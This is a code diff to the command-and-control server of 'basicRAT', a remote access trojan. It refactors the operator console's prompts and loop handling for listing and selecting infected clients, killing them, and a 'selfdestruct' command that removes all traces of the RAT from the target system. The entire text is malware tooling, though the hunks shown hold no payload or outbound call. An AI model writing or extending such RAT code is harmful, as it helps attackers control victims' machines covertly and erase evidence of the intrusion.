@@ -97,9 +97,8 @@ class ClientConnection(common.Client):
 
         # selfdestruct rat
         if cmd == 'selfdestruct':
-            quit_option = raw_input('Remove all traces of basicRAT from the ' \
-                                    'target system (y/N)? ')
-            if len(quit_option) and quit_option[0].lower() == 'y':
+            if raw_input('Remove all traces of basicRAT from the target ' \
+                         'system (y/N)? ').startswith('y'):
                 print 'Running selfdestruct...'
                 self.sendGCM(prompt)
                 self.conn.close()
@@ -180,16 +179,13 @@ def main():
         # display help text
         if cmd == 'help':
             print HELP_TEXT
-            continue
 
         # stop the server
         elif cmd == 'quit':
-            quit_option = raw_input('Exit the server and end all client ' \
-                                    'connections (y/N)? ')
-            if len(quit_option) and quit_option[0].lower() == 'y':
+            if raw_input('Exit the server and end all client connections ' \
+                         '(y/N)? ').startswith('y'):
                 # gracefull kill all clients here
                 sys.exit(0)
-            continue
 
         # select client
         elif cmd == 'client':
@@ -199,13 +195,15 @@ def main():
                 print 'Client {} selected.'.format(client.uid)
             else:
                 print 'Error: Invalid Client ID'
-            continue
 
         # list clients
         elif cmd == 'clients':
             print 'ID - Client Address'
             for k in server.get_clients():
                 print '{:>2} - {}'.format(k.uid, k.addr[0])
+
+        # continue loop for above commands
+        if cmd in ['client', 'clients', 'help', 'quit']:
             continue
 
         # require client id
@@ -222,7 +220,7 @@ def main():
             cmd = 'kill'
 
         # reset client id if client killed
-        if cmd == 'kill':
+        if cmd in ['kill', 'selfdestruct']:
             server.remove_client(client.uid)
             client = None
 
